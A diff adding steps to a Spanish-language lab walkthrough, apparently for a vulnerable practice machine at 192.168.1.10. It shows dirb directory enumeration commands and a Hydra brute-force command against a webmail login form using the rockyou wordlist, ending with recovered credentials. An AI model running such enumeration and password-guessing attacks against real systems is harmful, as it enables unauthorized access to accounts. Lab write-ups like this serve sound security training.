@@ -61,3 +61,32 @@ dirb http://192.168.1.10/monitoring -X .php -w /usr/share/wordlists/dirb/common.
 URL completa: `http://192.168.1.10/monitoring/login.php`
 
 ![6](https://user-images.githubusercontent.com/75953873/177060649-2c0299a6-1293-4ff3-bd57-3d7f2c377c33.png)
+
+```
+dirb http://192.168.1.10 -N .php,.html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+![7](https://user-images.githubusercontent.com/75953873/177060767-64de6138-1ce3-4e06-a2fe-6d73901a3d29.png)
+
+URL completa: `http://192.168.1.10/news`
+
+![8](https://user-images.githubusercontent.com/75953873/177060834-7c34ccb2-29a1-49ff-bf16-b4bee6137d79.png)
+
+```
+dirb http://192.168.1.10/news -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+![9](https://user-images.githubusercontent.com/75953873/177060944-32c81f13-e6db-4029-ac2c-f9e2d654ebf1.png)
+
+URL completa: `http://192.168.1.10/news/admin/`
+
+![10](https://user-images.githubusercontent.com/75953873/177060975-9ea24383-8fb2-4b1d-a3d2-b33eef1c75a0.png)
+
+- *Paso 6:* Aplicar fuerza bruta a inicio de sesión con Hydra.
+
+```
+hydra -l otis -P /usr/share/wordlists/rockyou.txt "http-post-form://192.168.1.10/webmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
+```
+![11](https://user-images.githubusercontent.com/75953873/177061160-81bd988d-c16b-4df4-a628-b2fdd41a1775.png)
+
+Usuario: `otis`
+
+Contraseña: `123456`
